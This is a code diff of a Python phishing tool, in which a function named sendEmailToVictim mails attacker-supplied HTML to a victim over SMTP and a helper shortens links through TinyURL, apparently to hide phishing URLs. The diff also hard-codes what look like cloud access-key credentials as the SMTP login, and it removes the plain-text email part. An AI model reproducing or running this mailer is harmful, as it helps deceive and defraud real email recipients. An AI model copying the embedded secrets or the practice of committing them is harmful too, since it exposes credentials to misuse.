@@ -113,28 +113,27 @@ def sendEmailToVictim(htmlTosend,subject, emailoftheatacker, emailofthevictim, s
         if starttls:
             server.starttls()
         
-        userSMTP=""
-        passwordSMTP=""
+        userSMTP="AKIAQKY5APLKTYGZWE6B" # set up with your user
+        passwordSMTP="BNeG8ph+q75AfmUQ/uXJjx9EWl3hEuV+EuWde+YZ6sT1" # Set up with your password
         
         # Login with your email credentials
         server.login(userSMTP, passwordSMTP)
+        
         # Create a MIMEMultipart message
         msg = MIMEMultipart('alternative')
         msg['From'] = emailoftheatacker
         msg['To'] = emailofthevictim
         msg['Subject'] = subject
-        # Create a MIMEText object for plain text content (optional)
-        text_part = MIMEText("This is the plain text version of the email.", 'plain')
-        msg.attach(text_part)
+        
         # Create a MIMEText object for HTML content
         html_part = MIMEText(htmlTosend, 'html')
         msg.attach(html_part)
+        
         # Send the email
         server.sendmail(emailoftheatacker, emailofthevictim, msg.as_string())
         print("Phishing Email was send\nEnjoy the results....")
         
 def urlShorter(url):
-    #api_key="FmBcfyS5YUdDHbcCE0EP0GR8UkUUgK3Xh3PyTkFnBNfd0Sa4MPzZKUIuOXci"
     api_url=f"https://tinyurl.com/api-create.php?url={url}"
     # Send GET request to TinyURL API
     response = requests.get(api_url)
